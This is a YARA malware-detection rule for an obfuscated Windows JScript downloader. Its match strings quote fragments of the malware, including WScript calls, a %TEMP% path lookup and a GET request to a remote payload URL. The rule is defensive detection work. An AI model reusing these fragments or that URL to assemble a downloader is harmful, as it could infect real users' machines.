rule sig_20160428_945d3d5b113475743a7d385fd2e00cd4 {
  meta:
    description = "datamaliciousorder - file 20160428_945d3d5b113475743a7d385fd2e00cd4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7fe7204422438dfde8428d4664e78368c19b291d47af15c24cd1883cb9a7deda"

  strings:
    $s1  = "function AkpYfoOsqRdfYftBvaQls(FwlQkrQtsDesBnzQtaFmq){CgmPhvHyeOdtGmcYusEkg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function AkpYfoOsqRdfYftBvaQls(FwlQkrQtsDesBnzQtaFmq){CgmPhvHyeOdtGmcYusEkg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function QedIweRrzJfrPhlAfyXrb() {return CgmPhvHyeOdtGmcYusEkg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var CgmPhvHyeOdtGmcYusEkg = function EyrMnpWllEekRyvEgvEhh() {return QzuAnlQreTqwTmyAkpEgc[OqzLgdNllSlgJipTvbZsn](\"WScript\"+\"" ascii
    $s5  = "return YovAmwSclRtuMhaMowIea - ZqhZbjFtwIhwTtfPhcUoy;};" fullword ascii
    $s6  = "function FjsEbmAjmOmbUcyDxzBmo(YovAmwSclRtuMhaMowIea, ZqhZbjFtwIhwTtfPhcUoy){RopBweKetLejHclAxjAap = RopBweKetLejHclAxjAap * 1; " ascii
    $s7  = "AbsNlgAgxNzfSqdRveUhu[SzcBgoGbtFdfAlwZroXqg](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s8  = "var QzuAnlQreTqwTmyAkpEgc = this[\"WScript\"];" fullword ascii
    $s9  = "var CgmPhvHyeOdtGmcYusEkg = function EyrMnpWllEekRyvEgvEhh() {return QzuAnlQreTqwTmyAkpEgc[OqzLgdNllSlgJipTvbZsn](\"WScript\"+\"" ascii
    $s10 = "function QedIweRrzJfrPhlAfyXrb() {return CgmPhvHyeOdtGmcYusEkg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (AbsNlgAgxNzfSqdRveUhu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function LfbCycYyhDnxCzkJmhXjj(){return YzcJsvMspJcyGqkThdCkh + \"\";};" fullword ascii
    $s13 = "function FjsEbmAjmOmbUcyDxzBmo(YovAmwSclRtuMhaMowIea, ZqhZbjFtwIhwTtfPhcUoy){RopBweKetLejHclAxjAap = RopBweKetLejHclAxjAap * 1; " ascii
    $s14 = "function WlzRehVefJoeMhcSbjIci(ZzuGimXonRdvReyVevUsh) {var RgxYhmWijNqnLxeKzqZfp = (1, 2, 3, 4, 5, ZzuGimXonRdvReyVevUsh); retur" ascii
    $s15 = "function CtqTkgBgwLiiTasUebIhi(){return 23;};" fullword ascii
    $s16 = "function WlzRehVefJoeMhcSbjIci(ZzuGimXonRdvReyVevUsh) {var RgxYhmWijNqnLxeKzqZfp = (1, 2, 3, 4, 5, ZzuGimXonRdvReyVevUsh); retur" ascii
    $s17 = "var IhkZszTmfUokUwqPwtNyr = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function RqvAbkMkgCwySvoEdaPyj()" fullword ascii
    $s19 = "return FjsEbmAjmOmbUcyDxzBmo(1 == 1 ? HiaCecLrsAftUguJatPre : 0, 1 == 1 ? DqrOpnSsbGhkTlqDgcKih : 0);" fullword ascii
    $s20 = "var BhwHgbIfwWthGohNcwYie = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}